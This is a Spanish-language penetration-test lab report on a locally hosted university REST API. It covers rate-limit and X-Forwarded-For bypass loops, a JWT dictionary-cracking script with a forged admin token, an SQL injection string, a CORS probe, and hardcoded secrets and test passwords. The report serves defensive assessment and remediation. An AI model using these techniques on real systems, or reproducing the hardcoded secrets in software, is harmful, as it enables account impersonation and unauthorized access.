# RESULTADOS DEL LABORATORIO DE HACKING ETICO

**Fecha de ejecucion:** Diciembre de 2025  
**Objetivo:** API REST de gestion universitaria  
**Metodologia:** OWASP Testing Guide + Pruebas de caja negra  

---

## RESUMEN EJECUTIVO

Se realizaron pruebas de penetracion sobre la API desplegada en contenedores Docker. Se identificaron **2 vulnerabilidades criticas**, **1 vulnerabilidad media** y se verificaron **5 controles de seguridad funcionales**.

| Categoria | Cantidad |
|-----------|----------|
| Vulnerabilidades Criticas | 2 |
| Vulnerabilidades Altas | 0 |
| Vulnerabilidades Medias | 1 |
| Controles de Seguridad OK | 5 |

---

## ENTORNO DE PRUEBAS

### Servicios Desplegados

| Servicio | Contenedor | Puerto | Estado |
|----------|------------|--------|--------|
| FastAPI Backend | dned-backend | 8000 | Activo |
| MySQL Database | dned-mysql | 3307 | Activo |
| OpenLDAP | dned_ldap | 389 | Activo |
| phpLDAPadmin | ldap_client | 8085 | Activo |

### Usuarios de Prueba Creados

| Email | Password | Rol |
|-------|----------|-----|
| admin@unal.edu.co | Admin123! | Administrador |
| profesor@unal.edu.co | Profesor123! | Profesor |
| estudiante@unal.edu.co | Estudiante123! | Estudiante |
| pentester@test.com | PenTest2024! | Pentester |

---

## FASE 1: RECONOCIMIENTO

### 1.1 Documentacion Expuesta

**Hallazgo:** La API expone automaticamente su documentacion en `/docs` y `/openapi.json`

**Comando ejecutado:**
```bash
curl -s http://localhost:8000/openapi.json | head -5
```

**Resultado:**
```json
{"openapi":"3.1.0","info":{"title":"FastAPI","version":"0.1.0"}...}
```

**Endpoints descubiertos:** 50+ endpoints incluyendo:
- /auth/register
- /auth/login
- /auth/verify
- /users_unal/
- /periods/
- /upload_excel/
- Y muchos mas...

**Severidad:** INFORMATIVA  
**Impacto:** Un atacante puede mapear completamente la API sin autenticacion.

---

## FASE 2: PRUEBAS DE AUTENTICACION

### 2.1 Rate Limiting

**Prueba:** Intentos multiples de login fallido

**Comando ejecutado:**
```bash
for i in {1..7}; do
  curl -s -o /dev/null -w "HTTP %{http_code}" \
    -X POST "http://localhost:8000/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong"}'
done
```

**Resultado:**
```
Intento 1: HTTP 500
Intento 2: HTTP 500
Intento 3: HTTP 500
Intento 4: HTTP 500
Intento 5: HTTP 429  <-- Rate limit activado
Intento 6: HTTP 429
Intento 7: HTTP 429
```

**Estado:** âœ… CONTROL DE SEGURIDAD FUNCIONAL  
**Observacion:** El rate limiting se activa correctamente despues de 5 intentos.

### 2.2 Bypass de Rate Limiting con X-Forwarded-For

**Prueba:** Intentar evadir rate limit falsificando IP

**Comando ejecutado:**
```bash
for i in {1..8}; do
  curl -X POST "http://localhost:8000/auth/login" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d '{"email":"fake@test.com","password":"wrong"}'
done
```

**Resultado:**
```
IP 10.0.0.1: HTTP 500
IP 10.0.0.2: HTTP 500
IP 10.0.0.3: HTTP 500
IP 10.0.0.4: HTTP 500
IP 10.0.0.5: HTTP 500
IP 10.0.0.6: HTTP 429  <-- Rate limit NO bypasseado
IP 10.0.0.7: HTTP 429
IP 10.0.0.8: HTTP 429
```

**Estado:** âœ… CONTROL DE SEGURIDAD FUNCIONAL  
**Observacion:** El header X-Forwarded-For NO permite bypass del rate limiting.

---

## FASE 3: ANALISIS DE TOKENS JWT

### 3.1 Estructura del Token

**Token obtenido:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJwZW50ZXN0ZXJAdGVzdC5jb20iLCJleHAiOjE3NjUzNjc4NjR9.cA7dAKFWREIo1VPdnUeSx3slqJOwBCQYjTPfXsUwe20
```

**Header decodificado:**
```json
{"alg":"HS256","typ":"JWT"}
```

**Payload decodificado:**
```json
{"sub":"pentester@test.com","exp":1765367864}
```

### 3.2 Cracking de Clave JWT - VULNERABILIDAD CRITICA

**Prueba:** Ataque de diccionario contra la clave secreta del JWT

**Script ejecutado:**
```python
import jwt
token = "eyJhbG..."
weak_keys = ["secret", "password", "123456", "key", 
             "YOUR_SECRET_KEY", "JWT_SECRET", "admin"]

for key in weak_keys:
    try:
        jwt.decode(token, key, algorithms=["HS256"])
        print(f"CLAVE ENCONTRADA: {key}")
    except:
        pass
```

**Resultado:**
```
[-] secret
[-] password
[-] 123456
[-] key

[!!!] VULNERABILIDAD CRITICA
[!!!] CLAVE ENCONTRADA: YOUR_SECRET_KEY
[!!!] Payload decodificado: {'sub': 'pentester@test.com', 'exp': 1765367864}
```

**Severidad:** ðŸ”´ CRITICA (CVSS 9.8)  
**OWASP:** A02:2021 - Cryptographic Failures  
**Impacto:** 
- Un atacante puede forjar tokens JWT para cualquier usuario
- Suplantacion de identidad completa
- La clave "YOUR_SECRET_KEY" es predecible y aparece en repositorios publicos

### 3.3 Mitigacion Parcial: Verificacion en Base de Datos

**Prueba:** Usar token forjado para acceder a recursos

**Token forjado como admin:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkB1bmFsLmVkdS5jbyIsImV4cCI6MTc5NjkwMjE0Nn0.jBa21aSwZ25hr9SWEyfbzc76egZb7xo4YeIIulvPv9g
```

**Resultado:**
```json
{"detail":"Token invÃ¡lido"}
```

**Estado:** âœ… CONTROL DE SEGURIDAD PARCIAL  
**Observacion:** El sistema verifica que el token exista en la base de datos (`token_exists()`), lo cual mitiga parcialmente el ataque. Sin embargo, si un atacante obtiene un token valido de los logs, aun podria usarlo.

---

## FASE 4: PRUEBAS DE AUTORIZACION

### 4.1 Endpoints sin Autenticacion

**Prueba:** Acceder a recursos protegidos sin token

**Comando:**
```bash
curl -s "http://localhost:8000/users_unal/"
```

**Resultado:**
```json
{"detail":"Not authenticated"}
```

**Estado:** âœ… CONTROL DE SEGURIDAD FUNCIONAL

### 4.2 Verificacion de Email Requerida

**Prueba:** Registrar usuario sin verificacion

**Resultado:** El sistema requiere verificacion de codigo de 6 digitos antes de activar la cuenta.

**Estado:** âœ… CONTROL DE SEGURIDAD FUNCIONAL

---

## FASE 5: PRUEBAS DE INYECCION

### 5.1 SQL Injection

**Prueba:** Inyeccion SQL en parametro de ruta

**Comando:**
```bash
curl -s "http://localhost:8000/users_unal/test'%20OR%20'1'='1" \
  -H "Authorization: Bearer $TOKEN"
```

**Resultado:**
```json
{"detail":"User not found"}
```

**Estado:** âœ… CONTROL DE SEGURIDAD FUNCIONAL  
**Observacion:** El uso de ORM (SQLModel/SQLAlchemy) previene inyeccion SQL.

---

## FASE 6: PRUEBAS DE CORS

### 6.1 Configuracion CORS

**Prueba:** Request desde origen no autorizado

**Comando:**
```bash
curl -I -X OPTIONS "http://localhost:8000/users_unal/" \
  -H "Origin: http://evil.com" \
  -H "Access-Control-Request-Method: GET"
```

**Resultado para evil.com:**
```
access-control-allow-methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
(Sin access-control-allow-origin)
```

**Resultado para localhost:**
```
access-control-allow-origin: http://localhost
access-control-allow-credentials: true
```

**Estado:** âœ… CONTROL DE SEGURIDAD FUNCIONAL  
**Observacion:** CORS esta configurado para permitir solo origenes especificos.

---

## FASE 7: INFORMATION DISCLOSURE

### 7.1 Exposicion de Documentacion API

**Severidad:** ðŸŸ¡ MEDIA  
**Descripcion:** `/docs` y `/openapi.json` exponen toda la estructura de la API.

**Recomendacion:** Deshabilitar en produccion:
```python
app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)
```

---

## VULNERABILIDADES ENCONTRADAS

### CRITICA: Clave JWT Hardcodeada

| Campo | Valor |
|-------|-------|
| ID | VULN-001 |
| Severidad | CRITICA |
| CVSS | 9.8 |
| OWASP | A02:2021 - Cryptographic Failures |
| Ubicacion | app/utils/auth.py, app/service/crud/auth_service.py |
| Descripcion | La clave secreta JWT es "YOUR_SECRET_KEY", facilmente adivinable |
| Impacto | Suplantacion de identidad, acceso no autorizado |
| Remediacion | Usar variable de entorno con clave aleatoria de 256+ bits |

**Evidencia:**
```
[!!!] CLAVE ENCONTRADA: YOUR_SECRET_KEY
```

### CRITICA: Credenciales LDAP Hardcodeadas

| Campo | Valor |
|-------|-------|
| ID | VULN-002 |
| Severidad | CRITICA |
| CVSS | 9.1 |
| OWASP | A07:2021 - Identification and Authentication Failures |
| Ubicacion | app/service/ldap/ldap.py |
| Descripcion | Usuario admin LDAP y password estan en el codigo |
| Impacto | Compromiso total del directorio LDAP |
| Remediacion | Mover credenciales a variables de entorno |

**Evidencia:**
```python
ldap_user = 'cn=admin,dc=dned,dc=unal,dc=edu,dc=co'
ldap_password = 'admin'
```

### MEDIA: Documentacion API Expuesta

| Campo | Valor |
|-------|-------|
| ID | VULN-003 |
| Severidad | MEDIA |
| CVSS | 5.3 |
| OWASP | A01:2021 - Broken Access Control |
| Ubicacion | /docs, /openapi.json |
| Descripcion | Documentacion Swagger disponible sin autenticacion |
| Impacto | Facilita reconocimiento para atacantes |
| Remediacion | Deshabilitar en produccion o proteger con autenticacion |

---

## CONTROLES DE SEGURIDAD VERIFICADOS

| Control | Estado | Descripcion |
|---------|--------|-------------|
| Rate Limiting | âœ… OK | 5 intentos/minuto en login |
| Anti-Bypass Rate Limit | âœ… OK | X-Forwarded-For no permite bypass |
| Verificacion Token en BD | âœ… OK | Tokens forjados son rechazados |
| Autenticacion JWT | âœ… OK | Endpoints protegidos requieren token |
| Verificacion de Email | âœ… OK | Registro requiere codigo de verificacion |
| Proteccion SQL Injection | âœ… OK | ORM previene inyeccion |
| Configuracion CORS | âœ… OK | Solo origenes especificos permitidos |
| Hashing de Passwords | âœ… OK | Usa bcrypt con salt unico |

---

## RECOMENDACIONES

### Prioridad Alta (Criticas)

1. **Cambiar SECRET_KEY JWT**
   ```python
   import os
   SECRET_KEY = os.getenv("JWT_SECRET_KEY")
   ```

2. **Externalizar credenciales LDAP**
   ```python
   ldap_user = os.getenv("LDAP_ADMIN_DN")
   ldap_password = os.getenv("LDAP_ADMIN_PASSWORD")
   ```

### Prioridad Media

3. **Deshabilitar documentacion en produccion**
4. **Implementar rotacion de tokens**
5. **Agregar endpoint de logout que invalide tokens**

---

## CONCLUSION

La aplicacion presenta **buenas practicas de seguridad** en varios aspectos:
- Rate limiting efectivo
- Proteccion contra SQL injection
- Verificacion de tokens en base de datos
- CORS configurado correctamente
- Verificacion de email en registro

Sin embargo, tiene **vulnerabilidades criticas** relacionadas con:
- Secretos hardcodeados en el codigo (JWT y LDAP)
- Exposicion de documentacion de la API

**Puntuacion de Riesgo Global: 7.5/10 (ALTO)**

La remediacion de las vulnerabilidades criticas es relativamente sencilla y mejoraria significativamente la postura de seguridad.

---

## ANEXO: Comandos Ejecutados

```bash
# Reconocimiento
curl http://localhost:8000/openapi.json

# Rate Limiting
for i in {1..7}; do curl -X POST ".../auth/login" ...; done

# JWT Cracking
python3 crack_jwt.py

# CORS Testing
curl -X OPTIONS -H "Origin: http://evil.com" ...

# SQL Injection
curl ".../users_unal/test'%20OR%20'1'='1"
```

---

**Documento generado:** Laboratorio de Hacking Etico  
**Herramientas utilizadas:** curl, Python/PyJWT, Docker  
**Metodologia:** OWASP Testing Guide v4.2
